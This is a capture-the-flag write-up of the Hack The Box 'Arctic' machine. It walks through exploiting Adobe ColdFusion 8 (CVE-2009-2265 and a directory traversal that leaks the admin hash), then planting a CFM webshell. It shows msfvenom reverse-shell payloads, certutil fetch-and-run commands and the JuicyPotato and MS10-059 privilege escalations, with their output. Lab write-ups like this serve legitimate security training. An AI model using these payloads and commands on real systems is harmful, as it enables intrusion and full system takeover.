---
title: Arctic - HacktheBox(Easy)
date: 2024-06-22
author: Habukhan
categories: [TryHackMe]
tags: [Hacking, CTFs, THM]
image: https://i.ibb.co/x2bNLDD/ar.jpg
---

* [The Best Academy to Learn Hacking.](https://account.hackthebox.com/register)
* [Beginner Friendly challenges on TryHackMe.](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)

# Arctic - HacktheBox(Easy)

Good evening again, I will present to you my writeup on the exploitation of a Level Windows Machine Facileon HacktheBox

Description:
* Arctic is pretty simple, but web server load times cause some operational issues. Basic troubleshooting is required for the exploit to work properly.

*  [The Best Academy to Learn Hacking.](https://account.hackthebox.com/register)
* Beginner Friendly challenges on TryHackMe [Here.](https://tryhackme.com/)

# Reconaissance

To start, I'm going to run a scan with my [nmapautonmap](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh) tool .
```bash
─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 18:24 CST
Initiating Ping Scan at 18:24
Scanning 10.129.136.143 [4 ports]
Completed Ping Scan at 18:24, 2.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.00s elapsed
Initiating SYN Stealth Scan at 18:24
Scanning 10.129.136.143 [1000 ports]
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:28 (0:00:00 remaining)
Completed SYN Stealth Scan at 18:28, 231.60s elapsed (1000 total ports)
Nmap scan report for 10.129.136.143
Host is up (2.0s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

----------------------------------------------------------------------------------------------------------
Open Ports : 135,8500,49154                                                                                                                                                                  
--------------------------------
Service scan Timing: About 66.67% done; ETC: 18:33 (0:00:47 remaining)
Nmap scan report for 10.129.136.143
Host is up (0.58s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
With my scan, I only find 3 ports which are open on the Machine including:

* Ports 135 & 49154: qui execute le Microsoft Windows RPC
* Port 8500 : which it executes Flight Message Transfert Protocol(FMTP)

By visiting port 8500 , I land on this page

![Artic - HacktheBox](https://i.ibb.co/Fn05ncT/image-86.png)

In these two (2) directories, while searching I came across a page /administratorwhich sent me to a login

![Artic - HacktheBox](https://i.ibb.co/5T2jpnd/ad.png)

* In this one I find in the title Adobe ColdFusion 8 Administrator. so I'm looking for exploits on Googleand onSearchsploit

![Artic - HacktheBox](https://i.ibb.co/X7zytVy/cold.png)

With this search I find the exploit 50057.pyand I copy it locally. Reading the exploit I see that it is the CVE-2009-2265.

* I open the exploit in my Sublime texteto read it a little and modify it at the IPs level, then I launch

```bash
─# python3 coldfusion.py         

Generating a payload...
Payload size: 1496 bytes
Saved as: c39559fbd32947c597bc9bbc08db4a9f.jsp

Priting request...
Content-type: multipart/form-data; boundary=854f29a3ce9247d89abbcf5729ffc490
Content-length: 1697

--854f29a3ce9247d89abbcf5729ffc490
Content-Disposition: form-data; name="newfile"; filename="c39559fbd32947c597bc9bbc08db4a9f.txt"
Content-Type: text/plain


Printing some information for debugging...
lhost: 10.10.16.4
lport: 1337
rhost: 10.129.136.143
rport: 8500
payload: c39559fbd32947c597bc9bbc08db4a9f.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.136.143] 49295
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

Now we have a non-privileged shell as tolisin the system. So we'll need to find a way to escalate privileges.
# Exploitation Manuelle(Directory Traversal )
By doing some research for manual exploitation and broadening my understanding, I found that this software is also vulnerable to a Directory Traversal Vulnerability

![Artic](https://i.ibb.co/NNBMZ6t/Screenshot-2024-02-29-at-19-04-46-Adobe-Cold-Fusion-Directory-Traversal.png)

From here I can see that we are told to send a request GETto the following PATH:/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

By running this query on Burpsuite, we get a return of a crypt password l'administrateurinsha1

![Artic](https://i.ibb.co/z8kC1Zy/burp1.png)
So using it crackstationI manage to crack it

![Artic](https://i.ibb.co/NWB1H3h/Screenshot-2024-02-29-at-19-11-03-Crack-Station-Online-Password-Hash-Cracking-MD5-SHA1-Linux-Rainbow.png)

# Shell
Now that I am in the admin panel, I will then try to have a shell on the machine which hosts this site by injecting a CFMmalicious file which will help us to execute commands remotely. For this we must:

* First to find our payload in cfm, I did some research on Github and I came across this [Payload](https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm) then I copied it locally
* Go to the Settings tab on the left and click on the “Mappings” section.
* One of the default mappings is C:\ColdFusion8\wwwroot\CFIDE. This is where I will write my shell so I copy this path
* Then I click on Debugging and Loggingto create one Scheduled Tasksby clicking onSchedule New Tasks
* Put the name I want, then in the url I put my IP of my http.serverwhich will host my payload cfmfollowed by the name of payload

```bash 
 webshell.cfm
                                                                                                                                                                                             
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Click on the optionSave output to a file
* Now I paste the path you got from Mappings into the “File” field followed by the name of my shell for exampleC:\ColdFusion8\wwwroot\CFIDE/hacked.cfm

Here is a picture of the necessary explanations that I have just given.

![Arctic](https://i.ibb.co/4Mv2hRg/b2.png)

Clicking on Submitthe site redirects me to http://10.129.201.72:8500/CFIDE/administrator/index.cfmtracking Sheduled Tasks.
* From here I click on Run Sheduled TasksIn the icons ofActions
![Arctic](https://i.ibb.co/ZJq7mSR/Screenshot-2024-02-29-at-19-47-16-Scheduled-Tasks.png)
I go back to my Terminal and I find that:

```bash└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.201.72 - - [29/Feb/2024 19:46:23] "GET /webshell.cfm HTTP/1.1" 200 -
10.129.201.72 - - [29/Feb/2024 19:47:07] "GET /webshell.cfm HTTP/1.1" 200 -
```

My shell was successfully downloaded to the Box. Now we need to find our file and execute it.
* Knowing that my file I put it under the name of hacked.cfmin the /CFIDEofC:\ColdFusion8\wwwroot\CFIDE/hacked.cfm
* So by visiting the http://10.129.201.72:8500/CFIDE/I find my file written and executing it withwhoami
![Artic](https://i.ibb.co/1TKjb8x/Screenshot-2024-02-29-at-19-58-10-Error-Occurred-While-Processing-Request.png)
With curlI will see what is written in this file
```bash
└─# curl -s "http://10.129.201.72:8500/CFIDE/hack.txt"  
arctic\tolis
```
* To have a shell in my machine, I will create a payload .exewith msfvenomit then send it to the site using one http.serverand write it in the C:\ColdFusion8\wwwroot\CFIDE/and execute it with thecurl
```bash
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]
└─# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=1337 -f exe > reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In the option here is my order: /c "certutil.exe -urlcache -f http://10.10.16.5/reverse.exe C:\ColdFusion8\wwwroot\CFIDE/hacked.exe"and TimeOutat 5 Finally by executing the payload with /c C:\ColdFusion8\wwwroot\CFIDE/hacked.exeI obtain

![Artic](https://i.ibb.co/NKfzK8f/b4.png)
# Privilege Escalation
Now that I have had initial access to the Machine, so now I will begin my search for Privilege Escalation


# 1er Methods(SeImpersonatePrivilege)

Starting with systeminfoto get an idea of ​​the version of the operating system running on the victim, as well as the architecture and patches installed with this command:

```bash
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
Hotfix(s):                 N/A

C:\ColdFusion8\runtime\bin>
```

* From this result, we see that this is an old version of Windows Server and that no patch has been installed.
When you find an old operating system and no patch installed, you should immediately think about one. exploitation du Kernel.

After gathering information about the target host, I checked the privileges of the current user tolis, as follows:

```bash
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\ColdFusion8\runtime\bin>
```

From here I can see that the user tolishas privileges SeImpersonatePrivilegewhich means I can make an attack to Potatobe Adminof this SYSTEM

If the user has the privileges SeImpersonate, SeAssignPrimaryTokenthen you are SYSTEM.

* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
* First I create a payload

```bash
└─# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=1338 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

* Then I download my payload and my JuicyPotato.exeinto the machine and into the same directory
```bash
C:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -split -f http://10.10.16.5/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\AppData\Local\Temp>



C:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/shell.exe shell.exe
certutil -urlcache -split -f http://10.10.16.5/shell.exe shell.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

And with all these files together I open my netcatand I execute JuicyPotatowith my payloadshell.exe

```bash
C:\Users\tolis\AppData\Local\Temp>.\JuicyPotato.exe -t * -p .\shell.exe -l 443
.\JuicyPotato.exe -t * -p .\shell.exe -l 443
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\tolis\AppData\Local\Temp>
```

* In my Listner netcat, I receive the connection asnt authority\system

![Artic](https://i.ibb.co/kDcDGxq/b5.png)

# 2eme Method(Kernel Exploit (MS10-059)
At the beginning we started by checking it systeminfoand then we were able to find that it is an old version of Windows Server and that no patch has been installed.

* The news

```bash
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
```

So while looking for some exploit I was able to come across this github
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

Its use is written in the github to create a user

```bash
c:\> Churraskito.exe "C:\windows\system32\cmd.exe" "net user 123 123 /add"
```

So I will download it into the target Box then execute it as explained

```bash
:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/MS10-059.exe MS10-059.exe
certutil -urlcache -split -f http://10.10.16.5/MS10-059.exe MS10-059.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\AppData\Local\Temp>.\MS10-059.exe
.\MS10-059.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
```

Here I am told that this exploit gives me a Shellif I enter a specific IP and a port

```bash
C:\Users\tolis\AppData\Local\Temp>.\MS10-059.exe 10.10.16.5 1338
.\MS10-059.exe 10.10.16.5 1338
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\Users\tolis\AppData\Local\Temp>


└─# sudo rlwrap nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.201.72] 49798
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\AppData\Local\Temp>
```

And now we are also administrators on the Box

![Artic](https://i.ibb.co/4N1mbkD/b6.png)

# Join Us

Let’s learn, explore, and hack together. Join us on Discord [here.](https://discord.gg/jxaAHsGM)